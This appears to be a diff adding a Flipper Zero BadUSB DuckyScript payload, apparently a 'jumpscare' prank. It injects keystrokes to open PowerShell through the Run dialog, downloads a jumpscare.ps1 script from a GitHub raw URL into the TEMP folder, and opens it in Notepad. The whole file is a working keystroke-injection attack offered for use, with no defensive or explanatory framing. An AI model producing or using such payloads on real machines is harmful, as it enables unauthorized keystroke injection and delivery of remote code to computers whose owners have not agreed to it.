@@ -1,0 +1,18 @@
+
+REM ==========================================
+REM CHICOBV - FLIPPER ZERO
+REM ==========================================
+
+DELAY 1000
+GUI r
+DELAY 700
+STRING powershell
+ENTER
+DELAY 1500
+
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/joaquincizmadija/fllipo/main/jumpscares/chicobv/jumpscare.ps1" -OutFile "$env:TEMP\jumpscare.ps1"
+ENTER
+DELAY 2500
+
+STRING notepad "$env:TEMP\jumpscare.ps1"
+ENTER
